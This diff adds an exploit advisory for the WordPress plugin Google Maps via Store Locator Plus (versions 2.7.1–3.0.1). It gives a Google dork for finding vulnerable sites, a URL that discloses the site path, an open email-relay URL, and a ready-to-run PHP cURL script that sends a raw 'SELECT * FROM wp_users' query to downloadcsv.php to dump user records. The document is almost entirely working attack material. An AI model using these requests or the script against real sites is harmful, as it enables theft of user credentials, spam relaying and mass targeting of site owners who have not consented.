@@ -1,0 +1,41 @@
+##################################################
+# Description : Wordpress Plugins - Google Maps via Store Locator Plus 
+Multiple Vulnerability
+# Version : 2.7.1 - 3.0.1
+# Link : http://wordpress.org/extend/plugins/store-locator-le/
+# Plugins : http://downloads.wordpress.org/plugin/store-locator-le.3.0.1.zip
+# Date : 26-05-2012
+# Google Dork : inurl:/wp-content/plugins/store-locator-le/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+Information Disclosure : Path Website
+http://www.exemple.com/wordpress/wp-content/plugins/store-locator-le/core/load_wp_config.php
+
+
+Send Email :
+http://www.exemple.com/wordpress/wp-content/plugins/store-locator-le/core/send-email.php?email_name=test&email_from=test@test.com&email_to=test@exemple.com&email_subject=test&email_message=test
+
+
+Blind SQL Injection :
+PostQuery.php
+<?php
+
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/store-locator-le/downloadcsv.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('query'=>"SELECT * FROM wp_users",
+     'filename'=>'test',
+     'all'=>'true'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
